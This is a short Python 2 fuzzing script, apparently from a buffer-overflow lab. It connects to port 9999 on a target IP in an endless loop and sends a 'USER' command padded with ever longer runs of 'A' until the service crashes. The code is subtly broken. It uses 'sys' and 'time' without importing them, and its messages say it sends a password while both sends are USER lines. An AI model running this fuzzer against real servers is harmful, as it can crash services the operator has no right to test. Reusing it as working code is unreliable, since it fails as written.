# -*- coding:utf-8 -*-
import socket

class FuzzyBo:

    def __init__(self, ip):

        self._ip = ip

    def m_fuzzybo(self):

        remoteip = self._ip

        size=0

        while True:

            string = "A"*size

            print "Fuzzing PASS with %s bytes" % len(string)
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((remoteip, 9999))
            except:
                print ("[-] Connection error!")
                sys.exit(1)

            print s.recv(1024)
            print "Sending username..."
            s.send('USER ' + string + '\r\n')
            print s.recv(1024)
            print "Sending pass..."
            s.send('USER LiveOverflow\r\n')
            print s.recv(1024)
            s.close()

            time.sleep(1)

            size += 100
            print ""

if __name__ == '__main__':

    fzz = FuzzyBo('ip')
    fzz.m_fuzzybo()
